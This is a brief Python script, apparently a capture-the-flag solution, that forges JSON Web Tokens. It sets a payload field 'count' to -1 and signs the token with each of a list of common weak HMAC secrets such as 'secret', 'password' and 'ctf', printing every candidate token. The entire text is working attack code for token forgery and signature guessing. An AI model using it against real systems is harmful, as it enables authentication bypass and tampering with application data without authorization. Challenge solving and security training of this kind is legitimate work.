import hmac
import hashlib
import base64
import json

# Create JWT components
header = {'alg': 'HS256', 'typ': 'JWT'}
payload = {'count': -1}

# Encode header and payload
header_b64 = base64.urlsafe_b64encode(json.dumps(header, separators=(',', ':')).encode()).decode().rstrip('=')
payload_b64 = base64.urlsafe_b64encode(json.dumps(payload, separators=(',', ':')).encode()).decode().rstrip('=')

print(f"Header: {header_b64}")
print(f"Payload: {payload_b64}")
print(f"Unsigned: {header_b64}.{payload_b64}")

# Try common secrets
secrets = ['secret', 'password', '123456', 'key', 'jwt', 'your-256-bit-secret', 'bootup', 'ctf']

for secret in secrets:
    message = f'{header_b64}.{payload_b64}'
    signature = hmac.new(secret.encode(), message.encode(), hashlib.sha256).digest()
    signature_b64 = base64.urlsafe_b64encode(signature).decode().rstrip('=')
    jwt_token = f'{header_b64}.{payload_b64}.{signature_b64}'
    print(f'Secret "{secret}": {jwt_token}')
